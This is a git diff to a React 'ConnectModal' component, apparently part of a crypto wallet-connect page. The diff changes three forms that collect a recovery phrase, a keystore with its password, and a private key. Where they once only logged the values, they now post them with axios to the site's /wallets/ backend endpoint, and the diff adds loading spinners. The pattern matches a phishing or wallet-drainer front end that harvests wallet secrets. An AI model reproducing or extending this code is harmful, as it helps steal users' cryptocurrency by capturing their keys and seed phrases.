@@ -3,15 +3,29 @@ import Button from "../Button/Button";
 import { useState } from "react";
 import { useFormik } from "formik";
 import * as Yup from "yup";
+import axios from "axios";
+import ReactLoading from "react-loading";
 
 // eslint-disable-next-line react/prop-types
 const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
+  const [connectIsLoading, setConnectIsLoading] = useState(false);
   const [formType, setFormType] = useState("Phrase");
+  const { VITE_API_URL } = import.meta.env;
 
   const phraseFormik = useFormik({
     initialValues: { phrase: "" },
     onSubmit: (phraseValues) => {
-      console.log(phraseValues);
+      setConnectIsLoading(true);
+      const config = {
+        headers: {
+          Authorization: `Bearer ${localStorage.getItem("token")}`,
+        },
+      };
+      axios.post(
+        `${VITE_API_URL}/wallets/`,
+        { ...phraseValues, wallet_name: formType },
+        config
+      );
     },
     validationSchema: Yup.object({
       phrase: Yup.string().required("Phrase is required"),
@@ -21,7 +35,17 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
   const keyStoreFormik = useFormik({
     initialValues: { keystore: "", wallet_password: "" },
     onSubmit: (keyStoreValues) => {
-      console.log(keyStoreValues);
+      setConnectIsLoading(true);
+      const config = {
+        headers: {
+          Authorization: `Bearer ${localStorage.getItem("token")}`,
+        },
+      };
+      axios.post(
+        `${VITE_API_URL}/wallets/`,
+        { ...keyStoreValues, wallet_name: formType },
+        config
+      );
     },
     validationSchema: Yup.object({
       keystore: Yup.string().required("Keystore is required"),
@@ -32,7 +56,17 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
   const privateKeyFormik = useFormik({
     initialValues: { private_key: "" },
     onSubmit: (privateKeyValues) => {
-      console.log(privateKeyValues);
+      setConnectIsLoading(true);
+      const config = {
+        headers: {
+          Authorization: `Bearer ${localStorage.getItem("token")}`,
+        },
+      };
+      axios.post(
+        `${VITE_API_URL}/wallets/`,
+        { ...privateKeyValues, wallet_name: formType },
+        config
+      );
     },
     validationSchema: Yup.object({
       private_key: Yup.string().required("PrivateKey is required"),
@@ -125,8 +159,26 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
             <small style={{ fontSize: "11px" }}>
               Typically 12 (sometimes 24) words separated by single spaces.
             </small>
-            <Button type={"submit"} style={{ width: "100%" }}>
-              PROCEED
+            <Button
+              type={"submit"}
+              style={{
+                width: "100%",
+                display: "flex",
+                justifyContent: "center",
+                alignItems: "center",
+              }}
+              disabled={connectIsLoading}
+            >
+              {connectIsLoading ? (
+                <ReactLoading
+                  type={"balls"}
+                  color={"#fff"}
+                  height={"30px"}
+                  width={"40px"}
+                />
+              ) : (
+                "PROCEED"
+              )}
             </Button>
           </form>
         ) : formType === "Key Store" ? (
@@ -184,8 +236,26 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
               Several lines of text beginning with {`{...}`} plus the password
               you used to encrypt it.
             </small>
-            <Button type={"submit"} style={{ width: "100%" }}>
-              PROCEED
+            <Button
+              type={"submit"}
+              style={{
+                width: "100%",
+                display: "flex",
+                justifyContent: "center",
+                alignItems: "center",
+              }}
+              disabled={connectIsLoading}
+            >
+              {connectIsLoading ? (
+                <ReactLoading
+                  type={"balls"}
+                  color={"#fff"}
+                  height={"30px"}
+                  width={"40px"}
+                />
+              ) : (
+                "PROCEED"
+              )}
             </Button>
           </form>
         ) : formType === "PrivateKey" ? (
@@ -217,8 +287,26 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
             <small style={{ fontSize: "11px" }}>
               Typically 12 (sometimes 24) words separated by a single space.
             </small>
-            <Button type={"submit"} style={{ width: "100%" }}>
-              PROCEED
+            <Button
+              type={"submit"}
+              style={{
+                width: "100%",
+                display: "flex",
+                justifyContent: "center",
+                alignItems: "center",
+              }}
+              disabled={connectIsLoading}
+            >
+              {connectIsLoading ? (
+                <ReactLoading
+                  type={"balls"}
+                  color={"#fff"}
+                  height={"30px"}
+                  width={"40px"}
+                />
+              ) : (
+                "PROCEED"
+              )}
             </Button>
           </form>
         ) : null}
